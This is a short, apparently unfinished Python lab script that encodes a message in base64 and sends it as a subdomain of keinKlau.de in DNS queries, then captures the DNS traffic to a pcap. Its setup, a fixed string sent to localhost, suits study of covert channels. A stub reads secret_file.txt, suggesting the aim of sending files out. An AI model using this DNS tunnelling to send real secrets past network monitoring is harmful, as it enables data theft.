from itertools import count
from scapy.all import sniff, wrpcap

import dns.message
import dns.query
import dns.name
import base64

def read_data ():
    file = open("secret_file.txt" , "r")
    file.read()
    file.close()

    #Hashing the date do ensure data integrity


def send_hidden_message(dns_server, hidden_message):

    encoded_message = base64.urlsafe_b64encode(hidden_message.encode()).decode()

    query_name = f"{encoded_message}.keinKlau.de"
    #query_name = f"{hidden_message}.keinKlau.de"
    query = dns.message.make_query(query_name, dns.rdatatype.A)

    try:
        response = dns.query.udp(query, dns_server)
        print("DNS-Anfrage gesendet. Antwort erhalten:")
        print(response)
    except Exception as e:
        print(f"Fehler beim Senden der DNS-Anfrage: {e}")

def pcap_writer():
    packets = sniff(iface= "eth0" ,filter="dns", count=100)
    wrpcap("send_data.pcap", packets)

if __name__ == "__main__":
    read_data()
    dns_server = "127.0.0.1"
    hidden_message = "Geheime Nachricht"
    send_hidden_message(dns_server, hidden_message)
